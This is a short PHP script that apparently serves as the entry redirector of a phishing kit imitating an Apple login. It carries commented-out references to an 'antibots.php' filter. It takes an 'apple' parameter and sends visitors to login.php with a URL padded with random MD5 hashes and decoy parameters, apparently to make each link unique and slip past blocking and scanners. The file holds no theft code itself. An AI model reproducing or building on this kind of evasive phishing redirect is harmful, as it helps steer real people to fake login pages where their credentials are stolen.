<?php
//require_once('antibots.php');
// include 'antibots.php';


$apple = $_REQUEST['apple'];
$praga = rand();
$praga = md5($praga);

header("location: login.php?$praga$praga&pid=$praga$praga&kapaichu$praga$marimarichupaco=$praga$praga&apple=$apple&kernel=$praga&unix=$praga-linux");
?>